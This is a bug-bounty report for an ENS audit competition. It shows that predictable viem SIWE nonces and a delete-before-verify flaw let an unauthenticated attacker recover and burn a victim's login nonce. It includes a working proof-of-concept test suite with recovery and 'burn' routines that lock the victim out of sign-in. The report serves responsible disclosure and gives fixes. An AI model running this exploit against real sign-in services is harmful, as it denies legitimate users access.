# 93124 w a low an unauthenticated attacker can recover a victim s siwe nonce verbatim and burn it before any verification locking the victim out of login

**Submitted on Sep 14th 2026 at 10:33:59 UTC by @spryon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93124
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Temporarily disabling user to access target site, such as:
* Locking up the victim from login
* Cookie bombing, etc.

## Description

## Brief/Intro

An unauthenticated attacker who brackets a victim's `POST /auth/nonce` with two of its own recovers the victim's SIWE login nonce **verbatim** — not by guessing. viem 2.52.2's `generateSiweNonce()` returns a 96-character window of a single shared `Math.random()` buffer whose index advances by **one character per call**, so two overlapping attacker windows contain every nonce issued between them. The attacker then destroys that nonce with a single `POST /auth/login` carrying no signature and no valid message, because the handler deletes it from KV before the message, domain, URI or signature is ever checked. The victim's genuine wallet-signed sign-in then fails with `Invalid nonce`, repeatably, against endpoints with no application rate limit — locking the victim out of login for as long as the attacker keeps going.

## Vulnerability Details

### 1. The nonce is a sliding window over one `Math.random()` buffer

`POST /auth/nonce` ([`routes/auth/index.ts:13`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/auth/index.ts#L13)) is unauthenticated and calls `createNonce` ([`services/auth/index.ts:33`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L33)), which uses viem's `generateSiweNonce()`. The installed version is **viem 2.52.2** (`workers/api-worker/node_modules/viem` → `viem@2.52.2_typescript@6.0.3_zod@4.1.13`), whose implementation is:

```js
// viem/_esm/utils/siwe/generateSiweNonce.js
export function generateSiweNonce() { return uid(96) }

// viem/_esm/utils/uid.js
const size = 256; let index = size; let buffer;
export function uid(length = 11) {
  if (!buffer || index + length > size * 2) {
    buffer = ''; index = 0;
    for (let i = 0; i < size; i++)
      buffer += ((256 + Math.random() * 256) | 0).toString(16).substring(1);
  }
  return buffer.substring(index, index++ + length);   // <-- advances by ONE
}
```

Source: [`src/utils/uid.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/uid.ts) and [`src/utils/siwe/generateSiweNonce.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/siwe/generateSiweNonce.ts) at tag `viem@2.52.2`.

Two defects in one line. The buffer is `Math.random()`, not a CSPRNG. And **`index++` advances by one character, not by `length`** — so consecutive nonces share 95 of 96 characters, and the buffer only regenerates roughly every 417 calls.

**This makes recovery exact, not probabilistic.** A nonce issued at buffer index *i* is `buffer[i .. i+95]`. An attacker who requests a nonce immediately before and immediately after the victim holds two overlapping windows whose union is the contiguous span `buffer[i .. j+96]` — and **every nonce issued in between is a verbatim substring of that span**. No brute force is involved.

### 2. `/auth/login` deletes the nonce before verifying anything

`createJWT` ([`services/auth/index.ts:74-100`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L74-L100)) runs `verifyAndConsumeNonce` as its **first** statement, and that helper ([`:42-55`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L42-L55)) does:

```ts
const value = yield* intoKVResult(env.KV.get(KV_KEY.AUTH.NONCE(nonce)))
if (!value) { yield* new InvalidNonceError({ message: 'Invalid nonce' }) }
yield* intoKVResult(env.KV.delete(KV_KEY.AUTH.NONCE(nonce)))   // <-- :52
return ok(value)
```

The `KV.delete` at [`:52`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L52) executes **before**:

| Check                                   | Line                                                                                                                                                            |
| --------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `safeParseSiweMessage(message)`         | [`:77`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L77)        |
| domain allowlist                        | [`:79-86`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L79-L86) |
| `uri === https://<domain>`              | [`:88-93`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L88-L93) |
| `safeVerifySiweMessage` (the signature) | [`:95`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L95)        |

So consuming a victim's nonce costs an attacker **no cryptographic material at all** — an arbitrary body naming the nonce is sufficient. `POST /auth/login` ([`routes/auth/index.ts:22`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/auth/index.ts#L22)) is likewise unauthenticated, and the worker applies no rate limiting (no binding in `wrangler.jsonc`, no middleware in `src/app/middleware/`). CORS is a bare wildcard ([`app/index.ts:15`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/index.ts#L15)).

### 3. A free confirmation oracle

The error responses distinguish the two cases. A nonce that existed in KV passes `verifyAndConsumeNonce` and fails later with `{"error":"Invalid SIWE domain"}`; a nonce that never existed returns `{"error":"Invalid nonce"}` ([`routes/auth/index.ts:54-59`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/auth/index.ts#L54-L59)). The attacker can therefore confirm which recovered candidates were live, for free.

### 4. The client's wallet prompt widens the window

The Manager fetches the nonce, then blocks on the user approving a signature in their wallet, then posts ([`auth.ts:22-54`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/notifications/data/queries/auth.ts#L22-L54)). That is a multi-second human-shaped gap between a nonce being minted and being used — entirely in the attacker's favour.

## Impact Details

### Selected impact: temporarily disabling the user's access — locking up the victim from login

The victim cannot sign in. Their wallet-signed EIP-4361 message is rejected with `Invalid nonce` because the nonce it names no longer exists. Each retry costs the victim another wallet signature prompt and costs the attacker roughly three HTTP requests. The PoC demonstrates **20 consecutive denials**.

The most direct evidence is test 8, which replays **one genuinely signed sign-in** in two worlds:

```
[8] WORLD A (no attacker) victim signed sign-in -> 500 { error: 'Internal server error' }
[8] WORLD A: nonce OK, message parsed, domain OK, uri OK -> execution reached safeVerifySiweMessage.
[8] WORLD B (attacker sent 3 unauthenticated /auth/login requests) -> 400 { error: 'Invalid nonce' }
[8] SAME signed message, SAME key, SAME domain. The only difference is the attacker. DENIED.
```

World A's 500 is the hermetic harness deliberately providing no database — i.e. the request passed every check this attack targets and died later, at a point the attack never reaches.

### Why the "only requires DDoS" exclusion does not apply

The window merge succeeds while fewer than \~95 nonces are issued between the attacker's two calls, so on a normal-traffic isolate this needs roughly **one `/auth/nonce` every few seconds**, and a burn round is a handful of `/auth/login` calls — tens of requests per second in total, orders of magnitude below anything describable as a denial-of-service. More decisively:

> **Volume alone cannot delete a nonce the attacker cannot name.** No quantity of traffic produces this effect without the prediction primitive. What is being exploited is the weak nonce and the delete-before-verify ordering, not bandwidth.

### What I am NOT claiming

* **No session takeover, and I could not construct one.** The nonce is not an identity binding, and `POST /auth/nonce` is unauthenticated with wildcard CORS anyway — a phishing site can simply fetch a valid nonce. Prediction adds nothing to a signature-phishing chain. This is not a Critical and I am not framing it as one.
* **The co-location probability is not measured.** viem's `uid` buffer is module-level state, so the *recovery* step requires the attacker and victim to be served by the same Cloudflare Worker isolate. Cloudflare's documentation states there is no guarantee either way. Three things favour the attacker — normally only one live isolate exists per machine per script, the attacker's own polling keeps isolates warm, and **a miss is free and self-detecting** (the two windows simply fail to join, costing two requests, and the attacker retries). But I have not measured the probability, and the PoC models a single isolate by construction. This is the honest ceiling on the finding.
* **The burn step is co-location-independent.** KV is global, so the `POST /auth/login` deletions work from anywhere. Only recovery needs the shared isolate.
* **Edge rate limiting is not visible in this repository.** "No rate limit" is established for the application; zone-level Cloudflare rules, if any, are not something I can see.

### Dedup

Nothing in the published known-issues list touches `/auth`. Specifically **not R2-03** — that is the 7-day HCA **session key**, which is generated by `@noble/curves` `randomPrivateKey()`, a CSPRNG; I checked explicitly, because a weak session key would have been far more serious. This is the SIWE **login nonce**, a different primitive from a different generator. Not R2-06 (session revocation), not R2-05 (SendGrid), not R3-01/R3-05 (client-side availability), not SEC-MGR-003/008/011. No Part-2 QA or tracker entry covers `/auth`.

### Fix — both halves are required

1. [`services/auth/index.ts:33`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L33) — replace `generateSiweNonce()` with a locally generated CSPRNG nonce (`crypto.getRandomValues`). viem is third-party and ENS cannot patch it.
2. [`services/auth/index.ts:52`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L52) — move the `KV.delete` to **after** `safeVerifySiweMessage` at [`:95`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L95), so an unsigned request cannot consume a nonce.

Either fix alone leaves half the chain intact: a CSPRNG nonce still lets anyone who *observes* a nonce burn it, and reordering the delete still leaves nonces predictable. Test 7 in the PoC is the contrast case — swapping `uid(96)` for a CSPRNG of identical length collapses the candidate space from 5 real substrings to 16^96.

## References

All repository links pinned to [`1c9b47f`](https://github.com/immunefi-team/audit-comp-ens/commit/1c9b47f18fcddd2e864dfe385c4171061c9811ae).

* [`routes/auth/index.ts#L13`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/auth/index.ts#L13) — `POST /auth/nonce`, unauthenticated
* [`routes/auth/index.ts#L22`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/auth/index.ts#L22) — `POST /auth/login`, unauthenticated
* [`routes/auth/index.ts#L54-L59`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/auth/index.ts#L54-L59) — the error-message oracle
* [`services/auth/index.ts#L33`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L33) — `createNonce` → `generateSiweNonce()`
* [`services/auth/index.ts#L42-L55`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L42-L55) — `verifyAndConsumeNonce`, delete at [`#L52`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L52)
* [`services/auth/index.ts#L74-L100`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/auth/index.ts#L74-L100) — every check that runs *after* the delete
* [`app/index.ts#L15`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/index.ts#L15) — bare `cors()`
* [`core/kv/index.ts#L6`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/kv/index.ts#L6) — the KV key
* [`apps/manager/.../auth.ts#L22-L54`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/notifications/data/queries/auth.ts#L22-L54) — the client flow, showing the wallet-prompt gap
* viem 2.52.2: [`src/utils/uid.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/uid.ts) · [`src/utils/siwe/generateSiweNonce.ts`](https://github.com/wevm/viem/blob/viem%402.52.2/src/utils/siwe/generateSiweNonce.ts)
* EIP-4361 (Sign-In with Ethereum) — <https://eips.ethereum.org/EIPS/eip-4361>

## Proof of Concept

**5/5 assertions pass.** The PoC imports `#app/index.js` — the **real Hono router** — and drives it with `app.fetch`. An in-memory KV is the only mock; there is no network, no database and no RPC. The runner copies the test into the package (so Node `#...` subpath imports resolve), runs it, and removes it on exit, leaving the repository clean.

### Run

```bash
bash run-lockout-poc.sh
```

`run-lockout-poc.sh`:

```bash
#!/usr/bin/env bash
# Hermetic PoC runner (deterministic lockout). Copies the test into the
# api-worker package so vitest discovers it and Node "#..." subpath imports
# resolve, runs it, then removes it so the repo ends clean.
# No network: only KV is mocked; every request under test returns before any
# DB/RPC I/O.
set -euo pipefail
SP="$(cd "$(dirname "$0")" && pwd)"
W=/run/media/hbt/work/ensdomains/audit-comp-ens/workers/api-worker
cp "$SP/siwe-nonce-lockout.poc.test.ts" "$W/src/__audit_siwe_lockout.poc.test.ts"
trap 'rm -f "$W/src/__audit_siwe_lockout.poc.test.ts"' EXIT
cd "$W"
npx vitest run src/__audit_siwe_lockout.poc.test.ts --reporter=verbose --disable-console-intercept
```

### What each assertion establishes

| Test | Establishes                                                                                                                                                               |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 4    | **Exact recovery.** Two attacker nonces bracketing the victim's produce a 100-char buffer window containing the victim's nonce verbatim — 5 real candidates, none guessed |
| 5    | **20/20 consecutive denials.** Each round: 3 unauthenticated `/auth/login` burns, then the victim is refused                                                              |
| 6    | The delete precedes parse/domain/uri/signature — a request with no valid message and no signature still consumes the nonce                                                |
| 7    | **Contrast / the fix.** A CSPRNG nonce of identical length produces zero overlap; recovery becomes impossible                                                             |
| 8    | **A genuinely wallet-signed sign-in is denied**, with the same signed message replayed in a world with and without the attacker                                           |

### Observed output

```
[4] attacker nonce #1 : 556473508e3f593148172fec579cf4ad3519c7db3ec6eb4efa481e4cbc8fcbd6ba9610238ef567ae2525a2ad5ace36a8
[4] attacker nonce #2 : 73508e3f593148172fec579cf4ad3519c7db3ec6eb4efa481e4cbc8fcbd6ba9610238ef567ae2525a2ad5ace36a8f8d4
[4] recovered buffer window (100 chars):
     556473508e3f593148172fec579cf4ad3519c7db3ec6eb4efa481e4cbc8fcbd6ba9610238ef567ae2525a2ad5ace36a8f8d4
[4] victim nonce      : 6473508e3f593148172fec579cf4ad3519c7db3ec6eb4efa481e4cbc8fcbd6ba9610238ef567ae2525a2ad5ace36a8f8
[4] victim nonce is a substring of the recovered window? true
[4] candidate nonces derivable from 2 attacker requests: 5 (all of them real, none guessed)

[5] round 1: attacker sent 3 unauthenticated /auth/login requests, 3 confirmed live-nonce hits; victim login -> 400 "Invalid nonce"
[5] ... (rounds 2-20 identical) ...
[5] victim denied sign-in in 20/20 consecutive attempts.

[6] attacker POST /auth/login -> 400 { error: 'Invalid SIWE domain' }
[6] the request carried no valid SIWE message and no signature, yet KV now holds the nonce? false

[7] with crypto.getRandomValues (same 96 hex chars):
    overlap between attacker nonces? false
    shared prefix/suffix chars between consecutive nonces: 0
    => recovery impossible; candidate space 16^96. This is the guard that is missing.

[8] WORLD A (no attacker) victim signed sign-in -> 500 { error: 'Internal server error' }
[8] WORLD A: nonce OK, message parsed, domain OK, uri OK -> execution reached safeVerifySiweMessage.
[8] WORLD B (attacker sent 3 unauthenticated /auth/login requests) victim signed sign-in -> 400 { error: 'Invalid nonce' }
[8] SAME signed message, SAME key, SAME domain. The only difference is the attacker. DENIED.

 Test Files  1 passed (1)
      Tests  5 passed (5)
```

### Complete PoC source — `siwe-nonce-lockout.poc.test.ts`

```ts
/**
 * Hermetic PoC #2 — api-worker SIWE nonce: DETERMINISTIC targeted login lockout.
 *
 * Strengthens vault/50-poc/siwe-nonce-uid/siwe-nonce.poc.test.ts.
 * The first PoC showed "16 candidates". This one shows the attacker does not
 * have to guess at all.
 *
 * viem 2.52.2 `uid(length)` (node_modules/.pnpm/viem@2.52.2.../_esm/utils/uid.js):
 *
 *     const size = 256; let index = size; let buffer;
 *     export function uid(length = 11) {
 *       if (!buffer || index + length > size * 2) { buffer=''; index=0;
 *         for (let i=0;i<size;i++) buffer += ((256+Math.random()*256)|0).toString(16).substring(1); }
 *       return buffer.substring(index, index++ + length);
 *     }
 *
 * `generateSiweNonce()` is `uid(96)`. So the Nth nonce issued by an isolate is
 * buffer[N .. N+95] of ONE 512-char Math.random() buffer, and the index advances
 * by ONE character per call.
 *
 * Consequence proved below: an attacker who BRACKETS the victim's /auth/nonce
 * call with two of its own /auth/nonce calls learns a contiguous window of the
 * buffer that CONTAINS the victim's nonce verbatim. No brute force, no guessing,
 * as long as fewer than 96 nonces were issued in between on that isolate.
 *
 * Combined with services/auth/index.ts:42-55 + :74-75 (KV.delete BEFORE parse,
 * domain, uri and signature checks) this is an unauthenticated, zero-wallet,
 * repeatable, TARGETED denial of sign-in.
 *
 * Everything here runs against the REAL Hono router (`#app/index.js`). The only
 * mock is an in-memory KV. No network, no DB, no RPC.
 */
import { describe, expect, it } from 'vitest'
import { privateKeyToAccount } from 'viem/accounts'
import { createSiweMessage } from 'viem/siwe'
import app from '#app/index.js'

const makeKv = () => {
  const store = new Map<string, string>()
  return {
    store,
    kv: {
      get: async (k: string) => store.get(k) ?? null,
      put: async (k: string, v: string) => {
        store.set(k, v)
      },
      delete: async (k: string) => {
        store.delete(k)
      },
    } as unknown as KVNamespace,
  }
}

const makeEnv = (kv: KVNamespace) =>
  ({
    KV: kv,
    JWT_SECRET: 'test-secret',
    CHAIN: 'sepolia',
    SEPOLIA_RPC_URL: 'http://127.0.0.1:1/never-called',
    DATABASE_URL: 'postgresql://u:p@db.localtest.me/db',
  }) as unknown as CloudflareBindings

const ctx = {
  waitUntil: () => {},
  passThroughOnException: () => {},
} as unknown as ExecutionContext

const getNonce = async (env: CloudflareBindings): Promise<string> => {
  const res = await app.fetch(
    new Request('https://app-api.ens.dev/auth/nonce', { method: 'POST' }),
    env,
    ctx,
  )
  expect(res.status).toBe(200)
  return (await res.json<{ nonce: string }>()).nonce
}

/** One unauthenticated POST /auth/login carrying NO cryptographic material. */
const burn = async (env: CloudflareBindings, nonce: string) => {
  const res = await app.fetch(
    new Request('https://app-api.ens.dev/auth/login', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        address: '0x000000000000000000000000000000000000dEaD',
        message: 'x',
        signature: '0xdeadbeef',
        nonce,
      }),
    }),
    env,
    ctx,
  )
  return { status: res.status, body: await res.json<{ error: string }>() }
}

/**
 * Merge two overlapping nonces into the contiguous buffer window they span.
 * Returns null if they do not overlap (buffer was regenerated in between).
 */
const mergeWindow = (first: string, second: string): string | null => {
  // second starts `shift` chars after first; find the shift by overlap search.
  // shift must be < first.length so that a genuine, non-empty overlap exists.
  for (let shift = 1; shift < first.length; shift++) {
    if (first.slice(shift) === second.slice(0, first.length - shift)) {
      return first + second.slice(first.length - shift)
    }
  }
  return null
}

describe('api-worker SIWE nonce — deterministic targeted login lockout', () => {
  it('4. bracketing recovers the victim nonce EXACTLY (no guessing)', async () => {
    const { kv } = makeKv()
    const env = makeEnv(kv)

    // attacker call #1
    const a1 = await getNonce(env)
    // ... unrelated traffic + the victim's browser hitting /auth/nonce ...
    const noise1 = await getNonce(env)
    const victim = await getNonce(env)
    const noise2 = await getNonce(env)
    // attacker call #2 (issued right after; attacker polls continuously)
    const a2 = await getNonce(env)

    const window = mergeWindow(a1, a2)
    expect(window).not.toBeNull()

    console.log('\n[4] attacker nonce #1 :', a1)
    console.log('[4] attacker nonce #2 :', a2)
    console.log('[4] recovered buffer window (%d chars):', window?.length)
    console.log('    ', window)
    console.log('[4] victim nonce      :', victim)
    console.log(
      '[4] victim nonce is a substring of the recovered window?',
      window?.includes(victim),
    )
    // the two decoy nonces are in there too — every nonce issued between the
    // two attacker calls is recoverable verbatim.
    expect(window?.includes(victim)).toBe(true)
    expect(window?.includes(noise1)).toBe(true)
    expect(window?.includes(noise2)).toBe(true)

    // Enumerate every 96-char substring of the window => the full set of nonces
    // issued in that span. The attacker does not need to know which is whose.
    const recovered: string[] = []
    for (let i = 0; i + 96 <= (window as string).length; i++) {
      recovered.push((window as string).slice(i, i + 96))
    }
    console.log(
      '[4] candidate nonces derivable from 2 attacker requests:',
      recovered.length,
      '(all of them real, none guessed)',
    )
    expect(recovered).toContain(victim)
  })

  it('5. burning the recovered window locks the victim out, repeatably', async () => {
    const { kv, store } = makeKv()
    const env = makeEnv(kv)

    let denied = 0
    const ROUNDS = 20
    console.log('')
    for (let round = 1; round <= ROUNDS; round++) {
      const a1 = await getNonce(env) // attacker
      const victim = await getNonce(env) // victim clicks "Sign in"
      const a2 = await getNonce(env) // attacker polls again
      const window = mergeWindow(a1, a2) as string

      // Attacker burns every 96-char substring of the window. It does not know
      // which one is the victim's; it does not need to.
      let burned = 0
      let oracleHits = 0
      for (let i = 0; i + 96 <= window.length; i++) {
        const cand = window.slice(i, i + 96)
        const r = await burn(env, cand)
        burned++
        // Error-message oracle: a nonce that EXISTED gets past the nonce check
        // and fails later, at the SIWE domain check. A nonce that did not exist
        // returns "Invalid nonce". The attacker can therefore confirm hits.
        if (r.body.error !== 'Invalid nonce') oracleHits++
      }

      // victim now submits its signed SIWE message
      const v = await burn(env, victim)
      if (v.body.error === 'Invalid nonce') denied++

      console.log(
        `[5] round ${round}: attacker sent ${burned} unauthenticated /auth/login requests, ` +
          `${oracleHits} confirmed live-nonce hits; victim login -> ${v.status} "${v.body.error}"`,
      )
      expect(store.has(`auth:nonce:${victim}`)).toBe(false)
    }

    console.log(
      `[5] victim denied sign-in in ${denied}/${ROUNDS} consecutive attempts.`,
    )
    expect(denied).toBe(ROUNDS)
  })

  it('6. the delete happens BEFORE parse/domain/uri/signature — nothing else is needed', async () => {
    const { kv, store } = makeKv()
    const env = makeEnv(kv)
    const n = await getNonce(env)
    expect(store.has(`auth:nonce:${n}`)).toBe(true)

    // garbage in every field except the nonce
    const r = await burn(env, n)
    console.log('\n[6] attacker POST /auth/login ->', r.status, r.body)
    console.log(
      '[6] the request carried no valid SIWE message and no signature, yet KV now holds the nonce?',
      store.has(`auth:nonce:${n}`),
    )
    expect(store.has(`auth:nonce:${n}`)).toBe(false)
    // proof the delete preceded the domain check: the error is the DOMAIN error,
    // i.e. execution got past verifyAndConsumeNonce.
    expect(r.body.error).toBe('Invalid SIWE domain')
  })

  it('7. CONTRAST — a CSPRNG nonce of the same length defeats the whole chain', () => {
    const csprngNonce = () =>
      Array.from(crypto.getRandomValues(new Uint8Array(48)), (b) =>
        b.toString(16).padStart(2, '0'),
      ).join('')

    const a1 = csprngNonce()
    const victim = csprngNonce()
    const a2 = csprngNonce()
    const window = mergeWindow(a1, a2)

    console.log('\n[7] with crypto.getRandomValues (same 96 hex chars):')
    console.log('    attacker #1:', a1)
    console.log('    victim     :', victim)
    console.log('    attacker #2:', a2)
    console.log('    overlap between attacker nonces?', window !== null)
    console.log(
      '    shared prefix/suffix chars between consecutive nonces:',
      a1.slice(1) === victim.slice(0, 95) ? 95 : 0,
    )
    expect(window).toBeNull()
    expect(a1.slice(1) === victim.slice(0, 95)).toBe(false)
    console.log(
      '    => recovery impossible; candidate space 16^96. This is the guard that is missing.',
    )
  })

  it('8. THE REAL THING: a genuinely wallet-signed sign-in is denied only because the nonce was burned', async () => {
    // The garbage-body requests in tests 5 and 6 prove the DELETE ordering, but
    // they do not prove a LEGITIMATE sign-in is denied. This test does: the
    // victim signs a real EIP-4361 message with a real key, exactly as
    // apps/manager/src/features/notifications/data/queries/auth.ts:22-54 does
    // (getNonce -> createSiweMessage -> signMessage -> POST /auth/login), and
    // the SAME signed request is replayed in two worlds.
    const victimAccount = privateKeyToAccount(
      '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
    )

    const signIn = async (env: CloudflareBindings, nonce: string) => {
      const message = createSiweMessage({
        address: victimAccount.address,
        domain: 'app.ens.dev',
        nonce,
        chainId: 11155111,
        uri: 'https://app.ens.dev',
        version: '1',
      })
      const signature = await victimAccount.signMessage({ message })
      const res = await app.fetch(
        new Request('https://app-api.ens.dev/auth/login', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            address: victimAccount.address,
            message,
            signature,
            nonce,
          }),
        }),
        env,
        ctx,
      )
      return { status: res.status, body: await res.json<{ error?: string }>() }
    }

    // --- World A: nobody attacks. The signed request gets PAST the nonce,
    //     parse, domain and uri checks and dies only at the RPC/DB boundary
    //     that this hermetic harness deliberately does not provide.
    {
      const { kv } = makeKv()
      const env = makeEnv(kv)
      const nonce = await getNonce(env)
      const r = await signIn(env, nonce)
      console.log('\n[8] WORLD A (no attacker) victim signed sign-in ->', r.status, r.body)
      expect(r.body.error).not.toBe('Invalid nonce')
      expect(r.body.error).not.toBe('Invalid SIWE domain')
      expect(r.body.error).not.toBe('Invalid SIWE uri')
      expect(r.body.error).not.toBe('Invalid SIWE message')
      console.log(
        '[8] WORLD A: nonce OK, message parsed, domain OK, uri OK -> execution reached safeVerifySiweMessage.',
      )
    }

    // --- World B: identical victim behaviour, but the attacker brackets the
    //     victim's /auth/nonce call and burns the recovered window first.
    {
      const { kv } = makeKv()
      const env = makeEnv(kv)
      const a1 = await getNonce(env)
      const victimNonce = await getNonce(env)
      const a2 = await getNonce(env)
      const window = mergeWindow(a1, a2) as string
      let burned = 0
      for (let i = 0; i + 96 <= window.length; i++) {
        await burn(env, window.slice(i, i + 96))
        burned++
      }
      const r = await signIn(env, victimNonce)
      console.log(
        `[8] WORLD B (attacker sent ${burned} unauthenticated /auth/login requests) victim signed sign-in ->`,
        r.status,
        r.body,
      )
      expect(r.status).toBe(400)
      expect(r.body.error).toBe('Invalid nonce')
      console.log(
        '[8] SAME signed message, SAME key, SAME domain. The only difference is the attacker. DENIED.',
      )
    }
  })
})
```
